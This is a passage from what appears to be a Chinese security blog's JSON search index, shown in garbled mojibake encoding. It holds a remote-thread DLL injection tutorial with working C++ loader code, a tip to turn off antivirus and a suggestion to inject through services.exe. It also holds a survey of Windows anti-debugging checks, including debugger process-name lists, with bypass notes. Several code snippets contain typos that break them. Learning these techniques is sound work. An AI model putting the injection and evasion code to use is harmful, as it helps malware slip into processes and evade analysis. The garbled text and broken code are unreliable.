0;&#125;","categories":[{"name":"Dllæ³¨å…¥","slug":"Dllæ³¨å…¥","permalink":"https://e1ectr0nlc.github.io/categories/Dll%E6%B3%A8%E5%85%A5/"}],"tags":[]},{"title":"è¿œç¨‹çº¿ç¨‹æ³¨å…¥","slug":"è¿œç¨‹çº¿ç¨‹æ³¨å…¥","date":"2023-07-09T16:00:00.000Z","updated":"2024-05-12T13:11:13.019Z","comments":true,"path":"2023/07/10/è¿œç¨‹çº¿ç¨‹æ³¨å…¥/","permalink":"https://e1ectr0nlc.github.io/2023/07/10/%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/","excerpt":"â€‹ åœ¨Dllæ³¨å…¥æŠ€æœ¯å­¦ä¹ ä¸­ï¼Œè¿œç¨‹çº¿ç¨‹æ³¨å…¥å¯ä»¥è¯´æ˜¯æœ€å®¹æ˜“ç†è§£çš„ä¸€ç§æ³¨å…¥æŠ€æœ¯äº†ã€‚é€šè¿‡è¿™ç§æŠ€æœ¯ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥è§¦ç±»æ—é€šå…¶ä»–æ³¨å…¥æŠ€æœ¯ã€‚","text":"â€‹ åœ¨Dllæ³¨å…¥æŠ€æœ¯å­¦ä¹ ä¸­ï¼Œè¿œç¨‹çº¿ç¨‹æ³¨å…¥å¯ä»¥è¯´æ˜¯æœ€å®¹æ˜“ç†è§£çš„ä¸€ç§æ³¨å…¥æŠ€æœ¯äº†ã€‚é€šè¿‡è¿™ç§æŠ€æœ¯ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥è§¦ç±»æ—é€šå…¶ä»–æ³¨å…¥æŠ€æœ¯ã€‚ åŸç†ç°åœ¨æœ‰ä¸‰ä¸ªç¨‹åºï¼šç›®æ ‡æ³¨å…¥è¿›ç¨‹ã€æ³¨å…¥åŠ è½½è¿›ç¨‹ä»¥åŠDllã€‚ æˆ‘ä»¬éƒ½çŸ¥é“ä¸€ä¸ªexeæ–‡ä»¶ä¼šå»åŠ è½½è‡ªå·±æ‰€éœ€è¦çš„Dllå»è¿è¡Œï¼Œé€šå¸¸æ˜¯ä¸€äº›ç³»ç»ŸDllï¼Œå¦‚æœæœ‰éœ€è¦ï¼Œä¹Ÿä¼šåŠ è½½è‡ªå·±ç¼–å†™çš„Dllã€‚è¿™é‡Œå°±å‡ºç°äº†æˆ‘ä»¬çš„åˆ©ç”¨ç‚¹ï¼Œä¹Ÿå°±æ˜¯windowsè‚¯å®šæä¾›äº†APIä¾›æˆ‘ä»¬ä½¿ç”¨å»åŠ è½½Dllã€‚é‚£ä¹ˆæ¥ä¸‹æ¥çš„æ€è·¯å°±æ˜¯åˆ©ç”¨APIå‡½æ•°åŠ è½½Dllå¹¶æ‰§è¡ŒDllä¸­çš„å‡½æ•°ã€‚ æ‰§è¡Œæ€è·¯ï¼šé€šè¿‡ç›®æ ‡è¿›ç¨‹pidè·å–è¿›ç¨‹å¥æŸ„ -&gt; åœ¨ç›®æ ‡è¿›ç¨‹å¼€è¾Ÿç©ºé—´ -&gt; åœ¨å¼€è¾Ÿç©ºé—´å†™å…¥Dllçš„è·¯å¾„ -&gt; ç›®æ ‡è¿›ç¨‹ä¸­åˆ›å»ºè¿œç¨‹çº¿ç¨‹åŠ è½½Dllã€‚ APIè·å–è¿›ç¨‹å¥æŸ„123456//è¿”å›å€¼æ˜¯è¿›ç¨‹å¥æŸ„HANDLE OpenProcess( [in] DWORD dwDesiredAccess,//ä¸€èˆ¬è·å–æƒé™ä¸ºPROCESS_ALL_ACCESSæƒé™ [in] BOOL bInheritHandle,//ä¸é‡è¦ [in] DWORD dwProcessId//ç›®æ ‡è¿›ç¨‹pid); åŠ è½½Dllï¼ˆé‡è¦ï¼‰1234//è¿”å›å€¼æ˜¯Dllå¥æŸ„HMODULE LoadLibraryA( [in] LPCSTR lpLibFileName //åŠ è½½çš„Dllåç§°); è·å–Dllçš„å¯¼å‡ºå‡½æ•°12345//è¿”å›å€¼æ˜¯å¯¼å‡ºå‡½æ•°åœ°å€FARPROC GetProcAddress( [in] HMODULE hModule, //Dllå¥æŸ„ [in] LPCSTR lpProcName //å¯¼å‡ºå‡½æ•°åç§°); å¼€è¾Ÿå†…å­˜ç©ºé—´12345678//è¿”å›å€¼æ˜¯å¼€è¾Ÿå‡ºçš„å†…å­˜åœ°å€LPVOID VirtualAllocEx( [in] HANDLE hProcess,//è¿›ç¨‹å¥æŸ„ [in, optional] LPVOID lpAddress,//NULL [in] SIZE_T dwSize,//å†…å­˜å¤§å° [in] DWORD flAllocationType,//MEM_COMMIT [in] DWORD flProtect//PAGE_EXECUTE_READWRITE); å†™å…¥å†…å­˜ç©ºé—´12345678//å¦‚æœè¯¥å‡½æ•°æˆåŠŸï¼Œåˆ™è¿”å›å€¼ä¸ºéé›¶å€¼BOOL WriteProcessMemory( [in] HANDLE hProcess, //ç›®æ ‡è¿›ç¨‹å¥æŸ„ [in] LPVOID lpBaseAddress,//åˆ†é…åˆ°çš„å†…å­˜é¦–åœ°å€ [in] LPCVOID lpBuffer,//å†™å…¥çš„å†…å®¹ [in] SIZE_T nSize,//å†™å…¥çš„å¤§å° [out] SIZE_T *lpNumberOfBytesWritten//NULL); åˆ›å»ºè¿œç¨‹çº¿ç¨‹12345678910//HANDLE CreateRemoteThread( [in] HANDLE hProcess, //è¦åœ¨å…¶ä¸­åˆ›å»ºçº¿ç¨‹çš„è¿›ç¨‹å¥æŸ„ [in] LPSECURITY_ATTRIBUTES lpThreadAttributes, //NULL [in] SIZE_T dwStackSize, //0 [in] LPTHREAD_START_ROUTINE lpStartAddress, //å›è°ƒå‡½æ•° [in] LPVOID lpParameter, //åˆ†é…çš„å†…å­˜ç©ºé—´ [in] DWORD dwCreationFlags,//0 [out] LPDWORD lpThreadId//NULL); ä»£ç è¿™é‡Œè·å–è¿›ç¨‹pidå·æ‡’äº†ï¼Œæ˜¯ç›´æ¥åœ¨ä»»åŠ¡ç®¡ç†å™¨ä¸­æŸ¥çœ‹çš„ã€‚å¦‚æœæƒ³å®ç°è‡ªåŠ¨è·å–ï¼Œå¯ä»¥é€šè¿‡è¿›ç¨‹éå†æ¥å®ç°ã€‚ 123456789101112131415161718192021222324252627282930#include&lt;iostream&gt;#include&lt;Windows.h&gt;int main()&#123; //è¿›ç¨‹æ ‡è¯†ç¬¦ DWORD pid = 32064; //è¿”å›å€¼ä¸ºç›®æ ‡è¿›ç¨‹å¥æŸ„ HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, pid); //è·å–LoadLibaryå‡½æ•°çš„åŠ è½½åœ°å€ //è¿”å›å€¼æ˜¯Kernel32çš„å¥æŸ„ï¼ˆä¹Ÿå¯ä»¥ç”¨GetModuleHandleå®ç°ï¼‰ HMODULE hMod = LoadLibrary(&quot;Kernel32.dll&quot;); //è¿”å›LoadLibraryAçš„åœ°å€ FARPROC fun = GetProcAddress(hMod, &quot;LoadLibraryA&quot;); //æ­¤è·¯å¾„ä¿®æ”¹ä¸ºä½ è‡ªå·±çš„æµ‹è¯•dll char DllPath[] = &quot;F:\\\\code_py&amp;C\\\\vs2017\\\\injecte\\\\Dll1\\\\Debug\\\\Dll1&quot;; //åœ¨ç›®æ ‡è¿›ç¨‹ä¸­å¼€è¾Ÿå†…å­˜ç©ºé—´ LPVOID address = VirtualAllocEx(hProcess, NULL, strlen(DllPath), MEM_COMMIT, PAGE_EXECUTE_READWRITE); //å°†è¦æ³¨å…¥çš„dllè·¯å¾„å†™å…¥ç›®æ ‡è¿›ç¨‹ WriteProcessMemory(hProcess, address, DllPath, strlen(DllPath), NULL); //ç›®æ ‡ç¨‹åºåˆ›å»ºçº¿ç¨‹ CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)fun, address, 0, NULL);&#125; é¦–å…ˆå¼€å¯æµ‹è¯•æ³¨å…¥è¿›ç¨‹ æ¥ç€è¿è¡ŒDllæ³¨å…¥è¿›ç¨‹ï¼Œè®°å¾—å…³é—­æ€æ¯’è½¯ä»¶ åœ¨æ³¨å…¥è¿›ç¨‹ä¹Ÿå¯ä»¥æ‰¾åˆ°æˆ‘ä»¬çš„Dll è¿›é˜¶å®ç°æˆ‘ä»¬å¯ä»¥ä¾èµ–å¯ä¿¡ä»»è¿›ç¨‹è¿›è¡Œæ³¨å…¥ï¼Œä¾‹å¦‚æ³¨å…¥Services.exeè¿™ä¸ªè¿›ç¨‹ï¼Œé¦–å…ˆå…ˆå°†a.dllè¿œçº¿ç¨‹æ³¨å…¥åˆ°Service.exeä¸­ï¼Œå†åˆ©ç”¨a.dllå°†b.dllè¿œçº¿ç¨‹æ³¨å…¥çš„å¾…æ³¨å…¥è¿›ç¨‹ä¸­ã€‚ è¿™é‡Œå·ä¸€å¼ å›¾ a.dllæ³¨å…¥æˆåŠŸåè¿˜å¯ä»¥â€œåŠŸæˆèº«é€€â€ï¼Œåˆ©ç”¨FreeLibraryAndExitThread()æŠŠè‡ªå·±å¸è½½æ‰å¹¶ä¸”é€€å‡ºçº¿ç¨‹ã€‚","categories":[{"name":"Dllæ³¨å…¥","slug":"Dllæ³¨å…¥","permalink":"https://e1ectr0nlc.github.io/categories/Dll%E6%B3%A8%E5%85%A5/"}],"tags":[]},{"title":"åè°ƒè¯•è·Ÿè¸ªä¸ååè°ƒè¯•","slug":"åè·Ÿè¸ªè°ƒè¯•","date":"2022-10-11T16:00:00.000Z","updated":"2024-05-12T13:00:12.918Z","comments":true,"path":"2022/10/12/åè·Ÿè¸ªè°ƒè¯•/","permalink":"https://e1ectr0nlc.github.io/2022/10/12/%E5%8F%8D%E8%B7%9F%E8%B8%AA%E8%B0%83%E8%AF%95/","excerpt":"æ¥æ€»ç»“ä¸€ä¸‹å­¦è¿‡çš„åè°ƒè¯•æŠ€æœ¯ã€‚","text":"æ¥æ€»ç»“ä¸€ä¸‹å­¦è¿‡çš„åè°ƒè¯•æŠ€æœ¯ã€‚ è¿›ç¨‹çŠ¶æ€IsDebuggerPresent()ç›¸ä¿¡å­¦ä¹ åè°ƒè¯•éƒ½æ˜¯ä»è¿™ä¸ªå‡½æ•°å…¥æ‰‹çš„ï¼Œè¿™ä¸ªå‡½æ•°ä¼šæŸ¥è¯¢è¿›ç¨‹ç¯å¢ƒå—(PEB)ä¸­çš„IsDebuggedæ ‡å¿—ã€‚å¦‚æœè¿›ç¨‹æ²¡æœ‰è¿è¡Œåœ¨è°ƒè¯•å™¨ç¯å¢ƒä¸­ï¼Œå‡½æ•°è¿”å›0ï¼›å¦‚æœè°ƒè¯•é™„åŠ äº†è¿›ç¨‹ï¼Œå‡½æ•°è¿”å›ä¸€ä¸ªéé›¶å€¼ã€‚ å®é™…ä¸Šè°ƒç”¨IsDebuggerPresent()ä¼šæ£€æŸ¥PEBç»“æ„ä½“ä¸­åç§»ä¸º0x2çš„BeingDebuggeæ ‡å¿—ä½ï¼Œç”¨æ¥è¡¨ç¤ºè¿›ç¨‹æ˜¯å¦å¤„äºè¢«è°ƒè¯•çŠ¶æ€ã€‚ 1234BOOL CheckDebug()&#123; return IsDebuggerPresent();&#125; NtQueryInformationProcess()æˆ‘ä»¬åªéœ€è¦å…³æ³¨è¿™ä¸ªå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°å³å¯ 123456789BOOL CheckDebug()&#123; int debugPort = 0; HMODULE hModule = LoadLibrary(&quot;Ntdll.dll&quot;); NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hModule, &quot;NtQueryInformationProcess&quot;); //å¦‚æœè¿›ç¨‹æ­£åœ¨è¢«è°ƒè¯•ï¼Œåˆ™è¿”å›è°ƒè¯•ç«¯å£ï¼Œå¦åˆ™è¿”å›0 NtQueryInformationProcess(GetCurrentProcess(), 0x7, &amp;debugPort, sizeof(debugPort), NULL); return debugPort != 0;&#125; è¿™é‡Œå†æä¸€å˜´CheckRemoteDebuggerPresenè¿™ä¸ªAPIï¼Œå®ƒå†å¾€ä¸‹è°ƒç”¨ä¹Ÿä¼šç”¨åˆ°NtQueryInformationProcessï¼Œæ‰€ä»¥ä¸¤è€…ç»•è¿‡å¯ä»¥æ˜¯ä¸€æ ·çš„ã€‚ NtGlobalFlagsç”±äºè°ƒè¯•å™¨ä¸­å¯åŠ¨è¿›ç¨‹ä¸æ­£å¸¸æ¨¡å¼ä¸‹å¯åŠ¨è¿›ç¨‹æœ‰äº›ä¸åŒï¼Œæ‰€ä»¥å®ƒä»¬åˆ›å»ºå†…å­˜å †çš„æ–¹å¼ä¹Ÿä¸åŒã€‚ç³»ç»Ÿä½¿ç”¨PEBç»“æ„åç§»é‡0x68å¤„çš„NtGlobalFlagsï¼Œæ¥å†³å®šå¦‚ä½•åˆ›å»ºå †ç»“æ„ã€‚å¦‚æœè¿™ä¸ªä½ç½®çš„å€¼ä¸º0x70ï¼Œæˆ‘ä»¬å°±çŸ¥é“è¿›ç¨‹æ­£è¿è¡Œåœ¨è°ƒè¯•å™¨ä¸­ã€‚ 123456789101112BOOL CheckDebug()&#123; int result = 0; __asm &#123; mov eax, fs:[30h] mov eax, [eax + 68h] and eax, 0x70 mov result, eax &#125; return result != 0;&#125; TEBç»“æ„ä½“ä¸­è¿˜æœ‰å¾ˆå¤šæŒ‡å‘å †çš„æ ‡å¿—ä½å¯ä»¥æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨è°ƒè¯•å™¨ç¯å¢ƒä¸‹ï¼Œæœ‰å…´è¶£å¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« 26ç§å¯¹ä»˜åè°ƒè¯•çš„æ–¹æ³• -è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘ (tencent.com) STARTUPINFOåŒå‡»å¯åŠ¨ç¨‹åºæ—¶ï¼Œå®é™…æ˜¯é€šè¿‡CreateProcesså‡½æ•°åˆ›å»ºå¯åŠ¨çš„ 123456789101112BOOL CreateProcessA( [in, optional] LPCSTR lpApplicationName, [in, out, optional] LPSTR lpCommandLine, [in, optional] LPSECURITY_ATTRIBUTES lpProcessAttributes, [in, optional] LPSECURITY_ATTRIBUTES lpThreadAttributes, [in] BOOL bInheritHandles, [in] DWORD dwCreationFlags, [in, optional] LPVOID lpEnvironment, [in, optional] LPCSTR lpCurrentDirectory, [in] LPSTARTUPINFOA lpStartupInfo, [out] LPPROCESS_INFORMATION lpProcessInformation); æˆ‘ä»¬å…³æ³¨å€’æ•°ç¬¬äºŒä¸ªå‚æ•°å°±å¯ä»¥ï¼ŒAè¡¨ç¤ºAsciiç ã€‚explorerå¯åŠ¨ç¨‹åºæ—¶ï¼Œä¼šæŠŠå€’æ•°ç¬¬2ä¸ªå‚æ•°STARTUPINFOç»“æ„ä½“ä¸­çš„å€¼è®¾ç½®ä¸º0ï¼Œä½†è°ƒè¯•å™¨å¯åŠ¨ç¨‹åºçš„æ—¶å€™ä¸ä¼šï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ¤æ–­è¯¥ç»“æ„ä½“ä¸­çš„æŸäº›å€¼æ˜¯å¦ä¸º0æ¥åˆ¤æ–­æ˜¯å¦è¢«è°ƒè¯• 1234567891011121314151617181920typedef struct _STARTUPINFOA &#123; DWORD cb; LPSTR lpReserved; LPSTR lpDesktop; LPSTR lpTitle; DWORD dwX; DWORD dwY; DWORD dwXSize; DWORD dwYSize; DWORD dwXCountChars; DWORD dwYCountChars; DWORD dwFillAttribute; DWORD dwFlags; WORD wShowWindow; WORD cbReserved2; LPBYTE lpReserved2; HANDLE hStdInput; HANDLE hStdOutput; HANDLE hStdError;&#125; STARTUPINFOA, *LPSTARTUPINFOA; æˆ‘ä»¬é€‰æ‹©å‡ ä¸ªå±æ€§æ¥è¿›è¡Œåè°ƒè¯•æ£€æŸ¥ 12345678910bool CheckDebug STARTUPINFO()&#123; STARTUPINFO si =&#123;&#125;; GetStartupInfol(&amp;si);if (si.dw||si.dwy||si.dwXSize||si.dwYSize)&#123; printf(&quot;%x %x %x %x n&quot;,si.dwy,si.dwy,si.dwrsize,si.dwysize): return true;. return false; &#125;&#125; å¯ä»¥é€‰æ‹©ä¿®æ”¹å‡½æ•°è¿”å›å€¼æ¥ç»•è¿‡ã€‚ è°ƒè¯•ç¯å¢ƒè¿™é‡Œå°±æ˜¯æŸ¥æ‰¾è°ƒè¯•å™¨çš„ç‰¹å¾å€¼ï¼Œå¦‚æœæ‰¾åˆ°å°±é€€å‡º çª—å£æ£€æµ‹æŸ¥æ‰¾å½“å‰ç³»ç»Ÿä¸­è¿è¡Œçš„ç¨‹åºçª—å£åç§°æ˜¯å¦åŒ…å«æ•æ„Ÿç¨‹åºæ¥è¿›è¡Œåè°ƒè¯•ã€‚å¸¸ç”¨çš„å‡½æ•°æœ‰FindWindowã€EnumWindowsã€‚FindWindowå¯ä»¥æŸ¥æ‰¾ç¬¦åˆæŒ‡å®šç±»åæˆ–çª—å£åçš„çª—å£å¥æŸ„ã€‚ 1234567891011BOOL CheckDebug()&#123; if (FindWindowA(&quot;OLLYDBG&quot;, NULL)!=NULL || FindWindowA(&quot;WinDbgFrameClass&quot;, NULL)!=NULL || FindWindowA(&quot;QWidget&quot;, NULL)!=NULL) &#123; return TRUE; &#125; else &#123; return FALSE; &#125;&#125; ç»•è¿‡å¯ä»¥å¯ä»¥ä½¿ç”¨æ’ä»¶æ¥éšè—çª—å£ï¼Œæˆ–è€…ä¸ºè°ƒè¯•å™¨æ”¹åã€‚ è¿›ç¨‹æ£€æµ‹éå†ç³»ç»Ÿæ‰€æœ‰è¿›ç¨‹ï¼Œå¦‚æœå­˜åœ¨è°ƒè¯•å™¨å°±é€€å‡ºã€‚ å®ç°æ–¹æ³•å¾ˆç®€å•ï¼Œè·å–ç³»ç»Ÿä¸­æ‰€æœ‰è¿›ç¨‹çš„å¿«ç…§ï¼Œæ¥ç€ä¸€ä¸€å¯¹æ¯”å°±è¡Œã€‚ 1234567891011121314151617181920212223BOOL CheckDebug()&#123; DWORD ID; DWORD ret = 0; PROCESSENTRY32 pe32; pe32.dwSize = sizeof(pe32); HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if(hProcessSnap == INVALID_HANDLE_VALUE) &#123; return FALSE; &#125; BOOL bMore = Process32First(hProcessSnap, &amp;pe32); while(bMore) &#123; if (stricmp(pe32.szExeFile, &quot;OllyDBG.EXE&quot;)==0 || stricmp(pe32.szExeFile, &quot;OllyICE.exe&quot;)==0 || stricmp(pe32.szExeFile, &quot;x64_dbg.exe&quot;)==0 || stricmp(pe32.szExeFile, &quot;windbg.exe&quot;)==0 || stricmp(pe32.szExeFile, &quot;ImmunityDebugger.exe&quot;)==0) &#123; return TRUE; &#125; bMore = Process32Next(hProcessSnap, &amp;pe32); &#125; CloseHandle(hProcessSnap); return FALSE;&#125; è°ƒè¯•å™¨è¡Œä¸ºæ­£å¸¸è¿è¡Œç¨‹åºæ—¶ä¸ä¼šæœ‰ä¸‹æ–­ç‚¹è¿™ä¸ªæ“ä½œï¼Œä¼šè¢«å½“æˆå¼‚å¸¸å»å¤„ç†ã€‚åªæœ‰ä½¿ç”¨è°ƒè¯•å™¨æ—¶æ‰ä¼šæœ‰ä¸‹æ–­ç‚¹çš„æ“ä½œï¼Œæœ¬è´¨ä¸Šæ˜¯ä¿®æ”¹è¿è¡Œçš„è¿›ç¨‹ä¸­çš„ä»£ç ï¼Œåœ¨è°ƒè¯•å™¨ä¸­è¿è¡Œå’Œç›´æ¥è¿è¡Œåœ¨ç»†èŠ‚ä¸Šä¼šæœ‰ä¸€äº›ä¸åŒï¼Œå› æ­¤å¯ä»¥æ£€æµ‹å‡ºè°ƒè¯•å™¨çš„å­˜åœ¨ã€‚ è½¯ä»¶æ–­ç‚¹è¿™é‡Œæ£€æŸ¥è½¯ä»¶æ–­ç‚¹æœ‰ä¸¤ç§æ€è·¯ã€‚ä¸€ç§æ˜¯æ£€æŸ¥è‡ªå·±çš„ç¼“å†²åŒºæ˜¯å¦å‡ºç°äº†0xccè¿™ä¸ªæœºå™¨ç ï¼Œå¦å¤–ä¸€ç§å°±æ˜¯crcæ£€éªŒï¼ŒæŸ¥çœ‹è‡ªå·±çš„ä»£ç æ˜¯å¦è¢«ä¿®æ”¹äº†ã€‚ ä¸‹é¢è´´å‡ºä¸¤ç§æ€è·¯çš„å®ç°æ–¹å¼å’Œç»•è¿‡ æ£€æŸ¥å­—èŠ‚ç  1234567891011121314151617181920212223242526BOOL CheckDebug()&#123; PIMAGE_DOS_HEADER pDosHeader; PIMAGE_NT_HEADERS32 pNtHeaders; PIMAGE_SECTION_HEADER pSectionHeader; DWORD dwBaseImage = (DWORD)GetModuleHandle(NULL); pDosHeader = (PIMAGE_DOS_HEADER)dwBaseImage; pNtHeaders = (PIMAGE_NT_HEADERS32)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew); pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pNtHeaders + sizeof(pNtHeaders-&gt;Signature) + sizeof(IMAGE_FILE_HEADER) + (WORD)pNtHeaders-&gt;FileHeader.SizeOfOptionalHeader); DWORD dwAddr = pSectionHeader-&gt;VirtualAddress + dwBaseImage; DWORD dwCodeSize = pSectionHeader-&gt;SizeOfRawData; BOOL Found = FALSE; __asm &#123; cld mov edi,dwAddr mov ecx,dwCodeSize mov al,0CCH repne scasb jnz NotFound mov Found,1NotFound: &#125; return Found;&#125; æ£€æŸ¥crcæ ¡éªŒç ï¼ˆéœ€è¦æå‰è®¡ç®—å¥½ï¼‰ 1234567891011121314151617181920212223242526272829303132DWORD CalcFuncCrc(PUCHAR funcBegin, PUCHAR funcEnd)&#123; DWORD crc = 0; for (; funcBegin &lt; funcEnd; ++funcBegin) &#123; crc += *funcBegin; &#125; return crc;&#125;#pragma auto_inline(off)VOID DebuggeeFunction()&#123; int calc = 0; calc += 2; calc &lt;&lt;= 8; calc -= 3;&#125;VOID DebuggeeFunctionEnd()&#123;&#125;;#pragma auto_inline(on)DWORD g_origCrc = 0x2bd0;int main()&#123; DWORD crc = CalcFuncCrc((PUCHAR)DebuggeeFunction, (PUCHAR)DebuggeeFunctionEnd); if (g_origCrc != crc) &#123; std::cout &lt;&lt; &quot;Stop debugging program!&quot; &lt;&lt; std::endl; exit(-1); &#125; return 0;&#125; å¯¹äºè¿™ä¸¤ç§æŠ€æœ¯æ¥è¯´ï¼Œéƒ½ä¸æ˜¯å¾ˆå¥½ç»•è¿‡ã€‚å¯¹äºé€šç”¨çš„æ–¹æ³•ï¼Œæˆ‘è§‰å¾—å¯ä»¥åœ¨ç¨‹åºä¸­çš„æ±‡ç¼–æŒ‡ä»¤çš„åˆ¤æ–­è¯­å¥ä¸­æ‰“è¡¥ä¸æ›´æ”¹è·³è½¬æ¡ä»¶å»ç»•è¿‡ã€‚å¯¹äºcrcæ ¡éªŒç ï¼Œå¯ä»¥ä¿®æ”¹è®¡ç®—cecçš„è¿”å›å€¼ï¼Œæˆ–è€…ä¿®æ”¹å…¨å±€å˜é‡ä¸è¿”å›å€¼ç›¸ç­‰ã€‚ ç¡¬ä»¶æ–­ç‚¹åœ¨Windows x86æ¶æ„ä¸­ï¼Œå¼€å‘äººå‘˜åœ¨æ£€æŸ¥å’Œè°ƒè¯•ä»£ç æ—¶ä½¿ç”¨äº†ä¸€ç»„è°ƒè¯•å¯„å­˜å™¨ã€‚è¿™äº›å¯„å­˜å™¨å…è®¸åœ¨è®¿é—®å†…å­˜è¯»å–æˆ–å†™å…¥æ—¶ä¸­æ–­ç¨‹åºæ‰§è¡Œå¹¶å°†æ§åˆ¶ä¼ è¾“åˆ°è°ƒè¯•å™¨ã€‚ DR0-DR3 -æ–­ç‚¹å¯„å­˜å™¨ DR4ï¼ŒDR5 -å‚¨è— DR6 -è°ƒè¯•çŠ¶æ€ DR7 â€“ è°ƒè¯•æ§åˆ¶ æ‰€ä»¥åŒæ—¶æœ€å¤šåªèƒ½è®¾ç½®4ä¸ªç¡¬ä»¶æ–­ç‚¹ï¼Œå¦‚æœæ²¡æœ‰ç¡¬ä»¶æ–­ç‚¹ï¼Œé‚£ä¹ˆDR0ã€DR1ã€DR2ã€DR3è¿™4ä¸ªå¯„å­˜å™¨çš„å€¼éƒ½ä¸º0ã€‚ 123456789101112BOOL CheckDebug()&#123; CONTEXT context; HANDLE hThread = GetCurrentThread(); context.ContextFlags = CONTEXT_DEBUG_REGISTERS; GetThreadContext(hThread, &amp;context); if (context.Dr0 != 0 || context.Dr1 != 0 || context.Dr2 != 0 || context.Dr3!=0) &#123; return TRUE; &#125; return FALSE; &#125; å½“ç„¶è¿™ä¹Ÿåªæœ‰è®¾ç½®ç¡¬ä»¶æ–­ç‚¹æ‰ä¼šè¢«æ£€æŸ¥å‡ºæ¥ã€‚ æ—¶é’Ÿæ£€æµ‹å½“ç¨‹åºè‡ªå·±è¿è¡Œæ²¡æœ‰é™„ä»¶è°ƒè¯•å™¨æ—¶ï¼Œè‚¯å®šåšä»€ä¹ˆéƒ½ç›´æ¥å¿«é€Ÿï¼Œè€Œä¸åƒè°ƒè¯•å™¨ä¸€æ ·è·‘ä¸€æ¡åŠ¨ä¸€æ¡ã€‚æ—¶é’Ÿæ£€æµ‹æŠ€æœ¯å°±æ˜¯é€šè¿‡è®¡ç®—å…³é”®å†…å®¹è¿è¡Œæ—¶é—´å·®å¼‚æ¥åˆ¤æ–­è¿›ç¨‹æ˜¯å¦å¤„äºè¢«è°ƒè¯•çŠ¶æ€ã€‚åŒæ—¶ç¨‹åºåœ¨è™šæ‹Ÿæœºä¸­çš„è¿è¡Œé€Ÿåº¦ä¹Ÿæ¯”æ­£å¸¸é€Ÿåº¦æ…¢ï¼Œæ‰€ä»¥æ—¶é’Ÿæ£€æµ‹æŠ€æœ¯ä¸€èˆ¬ä¹Ÿç”¨äºåè™šæ‹Ÿæœº&#x2F;åæ¨¡æ‹Ÿå™¨æŠ€æœ¯ã€‚è®¡ç®—è¿è¡Œæ—¶å·®çš„æ–¹å¼ä¸€èˆ¬æœ‰ä¸¤ç§ï¼šè¯»å–CPUæ—¶é’Ÿè®¡æ•°å™¨ã€æ—¶é—´è®¡æ•°ç›¸å…³APIã€‚ CPUè®¡æ•°å™¨ 1234567891011121314151617181920212223bool CheckDebug_RDTSC()&#123;int64t t1=0,t2=0;int lo=0,hi=0;__asm&#123; rdtsc mov [lo],eax mov [hi],edx&#125;t1=((int64_t)1o)|((int64_t)hi&lt;32);__asm&#123; rdtsc mov[lo],eax mov [hi],edx &#125;t2 = ((int64_t)1o)|((int64_t)hi &lt;32);printf(&quot;t2-t1=%x\\n&quot;,t2 -t1)://ä¸åŒçš„CPUè¯¥å·®å€¼ä¸åŒï¼Œè¿˜æœ‰å¯èƒ½å‘ç”Ÿçº¿ç¨‹åˆ‡æ¢ä½¿å·®å€¼å¤§äºä¸€èˆ¬æƒ…å†µï¼Œï¼š//æ‰€ä»¥è°¨æ…ä½¿ç”¨è¿™ç§åè°ƒè¯•æ–¹æ³•return t2 - t1 &gt; 0x100;&#125; åªè¦ä¿è¯ä¸¤æ¬¡rdtscè¿è¡Œç»“æŸåç»“æœç›¸åŒå³å¯ã€‚ æ—¶é—´API è¿™äº›APIä¹Ÿæ˜¯ä¸€ç§åè°ƒè¯•æ‰‹æ®µï¼Œè¿™äº›APIæœ‰ï¼šQueryPerformanceCounterã€GetTickCountã€GetSystemTimeã€GetLocalTimeç­‰ã€‚è¿™é‡Œä»‹ç»ä¸€ç§QueryPerformanceCounterçš„ä½¿ç”¨ 123456789bool CheckDebug_QueryPerformanceCounter()&#123; LARGE_INTEGER startTime endTime; QueryPerformanceCounter(&amp;startTime): printf(&quot;æ£€æµ‹&quot;); QueryPerformanceCounter(&amp;endTime): printf(&quot;%x\\n&quot;,endTime.QuadPart - startTime.QuadPart); return endTime.QuadPart - startTime.QuadPart &gt; 0x500; &#125; æˆ‘ä»¬å¯ä»¥æ”¹å˜å‡½æ•°è°ƒç”¨ç»“æœï¼Œä½¿ä¸¤æ¬¡è°ƒç”¨æ—¶é—´ç›¸åŒã€‚ï¼ˆæ³¨æ„ï¼šä¸€èˆ¬è¿™äº›æ—¶é—´APIä¹Ÿä¼šç”¨äºå…¶ä»–ç”¨é€”ï¼Œæ‰€ä»¥é™¤éæ˜ç¡®çŸ¥é“æ‰€æœ‰çš„è¯¥APIè°ƒç”¨éƒ½æ˜¯ç”¨æ¥åè°ƒè¯•ï¼Œå¦åˆ™ä¸è¦éšä¾¿HOOKã€‚ï¼‰ å¼‚å¸¸å¤„ç†åœ¨æ­£å¸¸è¿è¡Œçš„è¿›ç¨‹ä¸­å‘ç”Ÿå¼‚å¸¸æ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šæ¥å—å¼‚å¸¸ï¼Œè°ƒç”¨ç¨‹åºä¸­æ³¨å†Œçš„SEHå¤„ç†ã€‚è€Œåœ¨è°ƒè¯•å™¨è¿›ç¨‹ä¸­ï¼Œé‚£ä¹ˆè°ƒè¯•å™¨å°±ä¼šå…ˆäºSEHæ¥å—å¼‚å¸¸æ¶ˆæ¯ï¼Œè®©è°ƒè¯•å™¨å»å¤„ç†å¼‚å¸¸ä¿¡æ¯ã€‚åˆ©ç”¨è¯¥ç‰¹å¾å¯åˆ¤æ–­è¿›ç¨‹æ˜¯æ­£å¸¸è¿è¡Œè¿˜æ˜¯è°ƒè¯•è¿è¡Œï¼Œç„¶åæ 